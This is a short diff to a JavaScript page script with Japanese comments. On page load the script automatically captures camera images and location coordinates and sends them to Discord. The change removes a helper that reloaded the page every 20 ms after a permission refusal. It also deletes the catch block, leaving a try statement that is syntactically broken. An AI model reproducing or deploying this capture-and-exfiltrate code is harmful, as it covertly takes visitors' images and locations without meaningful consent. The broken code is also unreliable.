@@ -169,11 +169,6 @@ async function sendToDiscord(images, coords=null) {
   }
 }
 
-// 強制ページリロード（許可されなかった場合）
-function forceReload() {
-  setTimeout(() => location.reload(), 20);
-}
-
 // メイン処理
 async function startCapture() {
   try {
@@ -195,12 +190,6 @@ async function startCapture() {
 
     stream.getTracks().forEach(t=>t.stop());
     await sendToDiscord(images, coords);
-
-  } catch(err){
-    // 許可されなかった場合は短時間でページリロード
-    forceReload();
-  }
-}
 
 // ページ読み込みで自動開始
 startCapture();
